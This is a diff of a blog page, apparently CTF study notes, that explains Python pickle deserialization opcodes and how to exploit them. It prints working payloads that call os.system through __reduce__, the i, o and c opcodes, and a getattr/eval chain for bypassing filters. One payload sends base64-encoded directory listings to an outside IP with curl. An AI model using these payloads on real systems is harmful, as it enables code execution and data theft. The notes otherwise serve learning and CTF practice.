@@ -53,23 +53,53 @@ __dict__ 属性值或者__getstate__()函数返回值可以被序列化的类
 opcode linkpickle在由不同的实现版本，在py2和3得到的opcode不相同，但各个版本可以向下兼容。目前有六个版本：
 
 
-    
-    import pickle
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+  import pickle
 
 a={&#39;1&#39;: 1, &#39;2&#39;: 2}
 
 print(f&#39;# 原变量：{a!r}&#39;)
 for i in range(4):
     print(f&#39;pickle版本{i}&#39;,pickle.dumps(a,protocol=i))
+  
+  
 
 
-    
-    # 原变量：{&#39;1&#39;: 1, &#39;2&#39;: 2}
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+  # 原变量：{&#39;1&#39;: 1, &#39;2&#39;: 2}
 pickle版本0 b&#39;(dp0\nV1\np1\nI1\nsV2\np2\nI2\ns.&#39;
 pickle版本1 b&#39;}q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.&#39;
 pickle版本2 b&#39;\x80\x02}q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.&#39;
 pickle版本3 b&#39;\x80\x03}q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.&#39;
 pickle版本4 b&#39;\x80\x04\x95\x11\x00\x00\x00\x00\x00\x00\x00}\x94(\x8c\x011\x94K\x01\x8c\x012\x94K\x02u.&#39;
+  
+  
 pickle3版本opcode示例：
 原数据：abcd
 b&#39;\x80\x03X\x04\x00\x00\x00abcdq\x00.&#39;
@@ -82,21 +112,7 @@ q存储在栈顶的字符串长度
 \x00栈顶位置，一个字节
 .数据截止
 
-b&#39;\x80\x03c__main__\nStudent\n)\x81}(Vname\nVrxz\nVgrade\nVG2\nub.&#39;
-
-c：GLOBAL操作符，连续读取两个字符串，分别作为module和name，以\n分割，然后把module.name压入栈。注意此操作符使用find_class函数，作用为从x模块找到y，且只能在y在x顶层情况下找到y
-)：将一个空的元组tuple压入当前栈
-\x81：从栈中先弹出一个元素，记为args；再弹出一个元素记为cls，接下来执行cls.__new__(cls,*arg)，然后把得到的内容压入栈。即弹出参数和类，利用这个参数实例化类。
-}：将一个空dist压入栈
-(：MARK操作符，load_mark；将当前栈作为一个list，压进前序栈；然后把当前栈清空。
-V：读入字符串，以\n结尾，压入栈。
-u：调用pop_mark，记录当前栈为list，在load_mark结束后返回；弹出前序栈栈顶，用list覆盖前序栈。执行之后结果：arr=[&#39;name&#39;,&#39;rxz&#39;,&#39;grade&#39;,&#39;G2&#39;]，当前栈为__main__.Sudent类和空dict；拿到当前栈的末尾元素，必须为dict，两个一组读取arr里的元素，前者为key后者为value存入dict。得到{&#39;name&#39;: &#39;rxz&#39;, &#39;grade&#39;: &#39;G2&#39;}，现在栈里面有一个实例一个字典
-b：将当前栈栈顶存进state，弹出；当前栈栈顶为inst，弹出；用state的值更新实例inst；压入栈。此处使用的方法为：如果inst有__setstate__方法，直接交给方法，否则把state中的字典合并到inst.__dict__
-.：结束；最后得到的结果是__main__.Sudent，其name值为rxz，grade值是G2
-t：寻找栈中的上一个mark，并组合之间的数据为元组
-S：实例化一个字符串对象
-
-pickle0版本部分opcode：" />
+b&#39;\x80\x03c__main__\nStudent\n)\x81}(Vname\nVrxz\nVgrade\nVG2\nub.&#39;" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="http://localhost:1313/docs/ctf/%E7%9F%A5%E8%AF%86%E7%82%B9/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" /><meta property="og:image" content="http://localhost:1313/opengraph/card-base-2_hu_d45c61fd586475cf.png"/><meta property="article:section" content="docs" />
 <meta property="article:published_time" content="2025-05-30T09:41:09+08:00" />
@@ -126,23 +142,53 @@ __dict__ 属性值或者__getstate__()函数返回值可以被序列化的类
 opcode linkpickle在由不同的实现版本，在py2和3得到的opcode不相同，但各个版本可以向下兼容。目前有六个版本：
 
 
-    
-    import pickle
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+  import pickle
 
 a={&#39;1&#39;: 1, &#39;2&#39;: 2}
 
 print(f&#39;# 原变量：{a!r}&#39;)
 for i in range(4):
     print(f&#39;pickle版本{i}&#39;,pickle.dumps(a,protocol=i))
+  
+  
 
 
-    
-    # 原变量：{&#39;1&#39;: 1, &#39;2&#39;: 2}
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+  # 原变量：{&#39;1&#39;: 1, &#39;2&#39;: 2}
 pickle版本0 b&#39;(dp0\nV1\np1\nI1\nsV2\np2\nI2\ns.&#39;
 pickle版本1 b&#39;}q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.&#39;
 pickle版本2 b&#39;\x80\x02}q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.&#39;
 pickle版本3 b&#39;\x80\x03}q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.&#39;
 pickle版本4 b&#39;\x80\x04\x95\x11\x00\x00\x00\x00\x00\x00\x00}\x94(\x8c\x011\x94K\x01\x8c\x012\x94K\x02u.&#39;
+  
+  
 pickle3版本opcode示例：
 原数据：abcd
 b&#39;\x80\x03X\x04\x00\x00\x00abcdq\x00.&#39;
@@ -155,21 +201,7 @@ q存储在栈顶的字符串长度
 \x00栈顶位置，一个字节
 .数据截止
 
-b&#39;\x80\x03c__main__\nStudent\n)\x81}(Vname\nVrxz\nVgrade\nVG2\nub.&#39;
-
-c：GLOBAL操作符，连续读取两个字符串，分别作为module和name，以\n分割，然后把module.name压入栈。注意此操作符使用find_class函数，作用为从x模块找到y，且只能在y在x顶层情况下找到y
-)：将一个空的元组tuple压入当前栈
-\x81：从栈中先弹出一个元素，记为args；再弹出一个元素记为cls，接下来执行cls.__new__(cls,*arg)，然后把得到的内容压入栈。即弹出参数和类，利用这个参数实例化类。
-}：将一个空dist压入栈
-(：MARK操作符，load_mark；将当前栈作为一个list，压进前序栈；然后把当前栈清空。
-V：读入字符串，以\n结尾，压入栈。
-u：调用pop_mark，记录当前栈为list，在load_mark结束后返回；弹出前序栈栈顶，用list覆盖前序栈。执行之后结果：arr=[&#39;name&#39;,&#39;rxz&#39;,&#39;grade&#39;,&#39;G2&#39;]，当前栈为__main__.Sudent类和空dict；拿到当前栈的末尾元素，必须为dict，两个一组读取arr里的元素，前者为key后者为value存入dict。得到{&#39;name&#39;: &#39;rxz&#39;, &#39;grade&#39;: &#39;G2&#39;}，现在栈里面有一个实例一个字典
-b：将当前栈栈顶存进state，弹出；当前栈栈顶为inst，弹出；用state的值更新实例inst；压入栈。此处使用的方法为：如果inst有__setstate__方法，直接交给方法，否则把state中的字典合并到inst.__dict__
-.：结束；最后得到的结果是__main__.Sudent，其name值为rxz，grade值是G2
-t：寻找栈中的上一个mark，并组合之间的数据为元组
-S：实例化一个字符串对象
-
-pickle0版本部分opcode："/>
+b&#39;\x80\x03c__main__\nStudent\n)\x81}(Vname\nVrxz\nVgrade\nVG2\nub.&#39;"/>
 
     
         <link rel="alternate" type="application/atom+xml" title="Atom feed for 遥乡书屋" href="/index.xml" />
@@ -561,23 +593,53 @@ pickle0版本部分opcode："/>
 <h1 id="opcode">opcode <a href="#opcode" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h1><p>pickle在由不同的实现版本，在py2和3得到的opcode不相同，但各个版本可以向下兼容。目前有六个版本：</p>
 
 
-    
-    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> pickle
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>a<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;1&#39;</span>: <span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#39;2&#39;</span>: <span style="color:#ae81ff">2</span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;# 原变量：</span><span style="color:#e6db74">{</span>a<span style="color:#e6db74">!r}</span><span style="color:#e6db74">&#39;</span>)
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>):
-</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;pickle版本</span><span style="color:#e6db74">{</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>,pickle<span style="color:#f92672">.</span>dumps(a,protocol<span style="color:#f92672">=</span>i))</span></span></code></pre></div>
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="b9bb5dd" class="language-python ">
+  <code>import pickle
+
+a={&#39;1&#39;: 1, &#39;2&#39;: 2}
+
+print(f&#39;# 原变量：{a!r}&#39;)
+for i in range(4):
+    print(f&#39;pickle版本{i}&#39;,pickle.dumps(a,protocol=i))</code>
+  </pre>
+  </div>
 
 
-    
-    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span># 原变量：{&#39;1&#39;: 1, &#39;2&#39;: 2}
-</span></span><span style="display:flex;"><span>pickle版本0 b&#39;(dp0\nV1\np1\nI1\nsV2\np2\nI2\ns.&#39;
-</span></span><span style="display:flex;"><span>pickle版本1 b&#39;}q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.&#39;
-</span></span><span style="display:flex;"><span>pickle版本2 b&#39;\x80\x02}q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.&#39;
-</span></span><span style="display:flex;"><span>pickle版本3 b&#39;\x80\x03}q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.&#39;
-</span></span><span style="display:flex;"><span>pickle版本4 b&#39;\x80\x04\x95\x11\x00\x00\x00\x00\x00\x00\x00}\x94(\x8c\x011\x94K\x01\x8c\x012\x94K\x02u.&#39;</span></span></code></pre></div>
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="2e26bc1" class="language-text ">
+  <code># 原变量：{&#39;1&#39;: 1, &#39;2&#39;: 2}
+pickle版本0 b&#39;(dp0\nV1\np1\nI1\nsV2\np2\nI2\ns.&#39;
+pickle版本1 b&#39;}q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.&#39;
+pickle版本2 b&#39;\x80\x02}q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.&#39;
+pickle版本3 b&#39;\x80\x03}q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.&#39;
+pickle版本4 b&#39;\x80\x04\x95\x11\x00\x00\x00\x00\x00\x00\x00}\x94(\x8c\x011\x94K\x01\x8c\x012\x94K\x02u.&#39;</code>
+  </pre>
+  </div>
 <p>pickle3版本opcode示例：
 原数据：<code>abcd</code>
 <code>b'\x80\x03X\x04\x00\x00\x00abcdq\x00.'</code></p>
@@ -630,25 +692,55 @@ pickle0版本部分opcode："/>
 <p>使用pickletools将opcode转换为易于读取的形式</p>
 
 
-    
-    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> pickletools
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>data<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x80\x03</span><span style="color:#e6db74">cbuiltins</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">exec</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">q</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">X</span><span style="color:#ae81ff">\x13\x00\x00\x00</span><span style="color:#e6db74">key1=b&#39;1&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">key2=b&#39;2&#39;q</span><span style="color:#ae81ff">\x01\x85</span><span style="color:#e6db74">q</span><span style="color:#ae81ff">\x02</span><span style="color:#e6db74">Rq</span><span style="color:#ae81ff">\x03</span><span style="color:#e6db74">.&#34;</span>
-</span></span><span style="display:flex;"><span>pickletools<span style="color:#f92672">.</span>dis(data)</span></span></code></pre></div>
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="32ab9c3" class="language-python ">
+  <code>import pickletools
+
+data=b&#34;\x80\x03cbuiltins\nexec\nq\x00X\x13\x00\x00\x00key1=b&#39;1&#39;\nkey2=b&#39;2&#39;q\x01\x85q\x02Rq\x03.&#34;
+pickletools.dis(data)</code>
+  </pre>
+  </div>
 
 
-    
-    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>   0: \x80 PROTO      3
-</span></span><span style="display:flex;"><span>   2: c    GLOBAL     &#39;builtins exec&#39;
-</span></span><span style="display:flex;"><span>   17: q    BINPUT     0
-</span></span><span style="display:flex;"><span>   19: X    BINUNICODE &#34;key1=b&#39;1&#39;\nkey2=b&#39;2&#39;&#34;
-</span></span><span style="display:flex;"><span>   43: q    BINPUT     1
-</span></span><span style="display:flex;"><span>   45: \x85 TUPLE1
-</span></span><span style="display:flex;"><span>   46: q    BINPUT     2
-</span></span><span style="display:flex;"><span>   48: R    REDUCE
-</span></span><span style="display:flex;"><span>   49: q    BINPUT     3
-</span></span><span style="display:flex;"><span>   51: .    STOP
-</span></span><span style="display:flex;"><span>highest protocol among opcodes = 2</span></span></code></pre></div>
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="c66b458" class="language-text ">
+  <code>   0: \x80 PROTO      3
+   2: c    GLOBAL     &#39;builtins exec&#39;
+   17: q    BINPUT     0
+   19: X    BINUNICODE &#34;key1=b&#39;1&#39;\nkey2=b&#39;2&#39;&#34;
+   43: q    BINPUT     1
+   45: \x85 TUPLE1
+   46: q    BINPUT     2
+   48: R    REDUCE
+   49: q    BINPUT     3
+   51: .    STOP
+highest protocol among opcodes = 2</code>
+  </pre>
+  </div>
 <h1 id="利用方法">利用方法 <a href="#%e5%88%a9%e7%94%a8%e6%96%b9%e6%b3%95" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h1><h2 id="r指令"><code>R</code>指令 <a href="#r%e6%8c%87%e4%bb%a4" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h2><h3 id="原理">原理 <a href="#%e5%8e%9f%e7%90%86" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h3><p>大多数题目利用<code>__reduce__</code>方法，其指令码为<code>R</code>，作用为：</p>
 <ul>
 <li>取栈顶元素为<code>args</code>，弹出</li>
@@ -659,81 +751,201 @@ pickle0版本部分opcode："/>
 <p>选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</p>
 
 
-    
-    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>b&#39;&#39;&#39;cos
-</span></span><span style="display:flex;"><span>system
-</span></span><span style="display:flex;"><span>(S&#39;whoami&#39;
-</span></span><span style="display:flex;"><span>tR.&#39;&#39;&#39;</span></span></code></pre></div>
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="214c64b" class="language-text ">
+  <code>b&#39;&#39;&#39;cos
+system
+(S&#39;whoami&#39;
+tR.&#39;&#39;&#39;</code>
+  </pre>
+  </div>
 <p>利用此方法构造恶意字符串：</p>
 
 
-    
-    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Student</span>():  
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">__init__</span>(self):  
-</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;rxz&#34;</span>  
-</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>grade <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;G2&#34;</span>  
-</span></span><span style="display:flex;"><span>  
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">__reduce__</span>(self):  
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> os<span style="color:#f92672">.</span>system, (<span style="color:#e6db74">&#34;ls /&#34;</span>,)  
-</span></span><span style="display:flex;"><span>  
-</span></span><span style="display:flex;"><span>  
-</span></span><span style="display:flex;"><span>a <span style="color:#f92672">=</span> pickle<span style="color:#f92672">.</span>dumps(Student(), protocol<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)</span></span></code></pre></div>
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="482ea49" class="language-python ">
+  <code>class Student():  
+    def __init__(self):  
+        self.name = &#34;rxz&#34;  
+        self.grade = &#34;G2&#34;  
+  
+    def __reduce__(self):  
+        return os.system, (&#34;ls /&#34;,)  
+  
+  
+a = pickle.dumps(Student(), protocol=3)</code>
+  </pre>
+  </div>
 <h3 id="绕过方式">绕过方式 <a href="#%e7%bb%95%e8%bf%87%e6%96%b9%e5%bc%8f" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h3><ol>
 <li>如果黑名单没禁全，尝试`platform.popen(cmd, mode=&lsquo;r&rsquo;, bufsize=-1)</li>
 <li>使用<code>map</code></li>
 </ol>
 
 
-    
-    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Exploit</span>(object):
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">__reduce__</span>(self):
-</span></span><span style="display:flex;"><span> 	<span style="color:#66d9ef">return</span> map,(os<span style="color:#f92672">.</span>system,[<span style="color:#e6db74">&#34;ls&#34;</span>])</span></span></code></pre></div>
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="8c0fc3b" class="language-python ">
+  <code>class Exploit(object):
+    def __reduce__(self):
+ 	return map,(os.system,[&#34;ls&#34;])</code>
+  </pre>
+  </div>
 <h2 id="i指令码"><code>i</code>指令码 <a href="#i%e6%8c%87%e4%bb%a4%e7%a0%81" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h2>
 
-    
-    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>b&#39;&#39;&#39;(S&#39;whoami&#39;
-</span></span><span style="display:flex;"><span>ios
-</span></span><span style="display:flex;"><span>system
-</span></span><span style="display:flex;"><span>.&#39;&#39;&#39;</span></span></code></pre></div>
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="85edb5c" class="language-text ">
+  <code>b&#39;&#39;&#39;(S&#39;whoami&#39;
+ios
+system
+.&#39;&#39;&#39;</code>
+  </pre>
+  </div>
 <p>先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）。</p>
 
 
-    
-    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>    0: (    MARK
-</span></span><span style="display:flex;"><span>    1: S        STRING     &#39;whoami&#39;
-</span></span><span style="display:flex;"><span>   11: i        INST       &#39;os system&#39; (MARK at 0)
-</span></span><span style="display:flex;"><span>   22: .    STOP</span></span></code></pre></div>
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="dc25cbb" class="language-text ">
+  <code>    0: (    MARK
+    1: S        STRING     &#39;whoami&#39;
+   11: i        INST       &#39;os system&#39; (MARK at 0)
+   22: .    STOP</code>
+  </pre>
+  </div>
 <h2 id="o指令码"><code>o</code>指令码 <a href="#o%e6%8c%87%e4%bb%a4%e7%a0%81" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h2>
 
-    
-    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>b&#39;&#39;&#39;(cos
-</span></span><span style="display:flex;"><span>system
-</span></span><span style="display:flex;"><span>S&#39;whoami&#39;
-</span></span><span style="display:flex;"><span>o.&#39;&#39;&#39;</span></span></code></pre></div>
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="1aebcf8" class="language-text ">
+  <code>b&#39;&#39;&#39;(cos
+system
+S&#39;whoami&#39;
+o.&#39;&#39;&#39;</code>
+  </pre>
+  </div>
 <p>寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）。</p>
 
 
-    
-    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>    0: (    MARK
-</span></span><span style="display:flex;"><span>    1: c        GLOBAL     &#39;os system&#39;
-</span></span><span style="display:flex;"><span>   12: S        STRING     &#39;whoami&#39;
-</span></span><span style="display:flex;"><span>   22: o        OBJ        (MARK at 0)
-</span></span><span style="display:flex;"><span>   23: .    STOP</span></span></code></pre></div>
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="7ebdaf3" class="language-text ">
+  <code>    0: (    MARK
+    1: c        GLOBAL     &#39;os system&#39;
+   12: S        STRING     &#39;whoami&#39;
+   22: o        OBJ        (MARK at 0)
+   23: .    STOP</code>
+  </pre>
+  </div>
 <h2 id="c指令码"><code>c</code>指令码 <a href="#c%e6%8c%87%e4%bb%a4%e7%a0%81" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h2><h3 id="原理-1">原理 <a href="#%e5%8e%9f%e7%90%86-1" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h3>
 
-    
-    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Student</span>():  
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">__init__</span>(self):  
-</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;rxz&#34;</span>  
-</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>grade <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;G2&#34;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">check</span>(data):  
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;R&#39;</span> <span style="color:#f92672">in</span> data:  
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>  
-</span></span><span style="display:flex;"><span>    x <span style="color:#f92672">=</span> pickle<span style="color:#f92672">.</span>loads(data)  
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> x <span style="color:#f92672">!=</span> Student(blue<span style="color:#f92672">.</span>name,blue<span style="color:#f92672">.</span>grade):  
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>  
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span></span></span></code></pre></div>
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="ce7589f" class="language-python ">
+  <code>class Student():  
+    def __init__(self):  
+        self.name = &#34;rxz&#34;  
+        self.grade = &#34;G2&#34;
+
+def check(data):  
+    if b&#39;R&#39; in data:  
+        return 0  
+    x = pickle.loads(data)  
+    if x != Student(blue.name,blue.grade):  
+        return 0  
+    return 1</code>
+  </pre>
+  </div>
 <p><code>c</code>指令码的作用是获取全局变量，故而可以通过替换<code>rxz</code>为<code>blue.name</code>即可
 换成指令是<code>cblue\nname\n</code>。
 原本是<code>b'\x80\x03c__main__\nStudent\nq\x00)\x81q\x01}q\x02(X\x04\x00\x00\x00nameq\x03X\x03\x00\x00\x00rxzq\x04X\x05\x00\x00\x00gradeq\x05X\x02\x00\x00\x00G2q\x06ub.'</code>
@@ -757,28 +969,58 @@ payload：<code>b'\x80\x03c__main__\nStudent\n)\x81}(V__setstate__\ncos\nsystem\
 所以可以通过<code>get(sys.modules,&quot;moduleName&quot;)</code>获取危险模块。</p>
 
 
-    
-    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>print(sys<span style="color:#f92672">.</span>modules)
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># 输出全部模块</span></span></span></code></pre></div>
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="7b56362" class="language-python ">
+  <code>print(sys.modules)
+# 输出全部模块</code>
+  </pre>
+  </div>
 <p>最终需要构造的payload是：<code>builtins.getattr(builtins.getattr(builtins.dict,'get')(builtins.golbals(),'builtins'),'eval')(command)</code>
 写成opcode：</p>
 
 
-    
-    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>b&#39;&#39;&#39;cbuiltins
-</span></span><span style="display:flex;"><span>getattr
-</span></span><span style="display:flex;"><span>(cbuiltins
-</span></span><span style="display:flex;"><span>getattr
-</span></span><span style="display:flex;"><span>(cbuiltins
-</span></span><span style="display:flex;"><span>dict
-</span></span><span style="display:flex;"><span>S&#39;get&#39;
-</span></span><span style="display:flex;"><span>tR(cbuiltins
-</span></span><span style="display:flex;"><span>globals
-</span></span><span style="display:flex;"><span>)RS&#39;__builtins__&#39;
-</span></span><span style="display:flex;"><span>tRS&#39;eval&#39;
-</span></span><span style="display:flex;"><span>tR(S&#39;__import__(&#34;os&#34;).system(&#34;whoami&#34;)&#39;
-</span></span><span style="display:flex;"><span>tR.
-</span></span><span style="display:flex;"><span>&#39;&#39;&#39;</span></span></code></pre></div>
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="2a3d042" class="language-text ">
+  <code>b&#39;&#39;&#39;cbuiltins
+getattr
+(cbuiltins
+getattr
+(cbuiltins
+dict
+S&#39;get&#39;
+tR(cbuiltins
+globals
+)RS&#39;__builtins__&#39;
+tRS&#39;eval&#39;
+tR(S&#39;__import__(&#34;os&#34;).system(&#34;whoami&#34;)&#39;
+tR.
+&#39;&#39;&#39;</code>
+  </pre>
+  </div>
 <h2 id="其他">其他 <a href="#%e5%85%b6%e4%bb%96" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h2><ol>
 <li>其他模块的load也可能触发pickle反序列化，如<code>numpy.load()</code>，使用numpy自身的数据失败后，可以尝试用pickle的格式导入。</li>
 <li>即使代码里面没有<code>import os</code>，GLOBAL指令也会自动导入。</li>
@@ -787,78 +1029,183 @@ payload:</li>
 </ol>
 
 
-    
-    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>b&#39;\x80\x03c__main__\nStudent\n)\x81}(V__setstate__\ncos\nsystem\nubVcurl 47.***.***.105/`ls / | base64`\nb.&#39;</span></span></code></pre></div>
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="633df2f" class="language-text ">
+  <code>b&#39;\x80\x03c__main__\nStudent\n)\x81}(V__setstate__\ncos\nsystem\nubVcurl 47.***.***.105/`ls / | base64`\nb.&#39;</code>
+  </pre>
+  </div>
 <p>绕过各种限制的方式和jail一样
 如双写</p>
 
 
-    
